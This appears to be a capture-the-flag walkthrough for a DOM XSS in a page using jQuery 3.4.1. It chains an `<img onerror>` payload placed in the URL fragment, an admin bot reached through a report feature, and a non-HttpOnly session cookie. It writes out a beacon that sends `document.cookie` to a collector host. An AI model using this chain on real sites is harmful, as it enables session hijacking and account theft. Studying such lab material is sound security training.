`$()` with an HTML-looking string **constructs** the described elements instead
of selecting them — and jQuery **3.4.1** (this page pins it; anything < 3.5) is
loose about what counts as HTML. So a fragment beginning with a tag becomes live
DOM built in the page.

A bare `<script>` built this way will not execute, but an element with an event
handler that fires **on load** will. `<img src=x onerror=...>` is the reliable
primitive: `$()` constructs the `<img>`, the browser tries to load `src=x`, that
fails, and `onerror` runs your code — no click needed. (A detached image still
loads its `src`, so it works even though the node is never inserted.)

`POST /report` (the "report a page to staff" feature) queues a same-site path
that the admin bot then visits — carrying its `session` cookie, which is **not**
`HttpOnly`, so `document.cookie` can read it. The whole payload goes in the URL
**fragment** (`/#...`); the fragment stays client-side and lands in
`location.hash`, exactly where the sink reads from.

Where do you send the cookie? The only listener reachable from the bot's network
is the collector at `http://collector:9000/` (that network has no internet
route). An image beacon — `new Image().src = 'http://collector:9000/report?c=' +
encodeURIComponent(document.cookie)` — fires a GET there with no CORS worries.
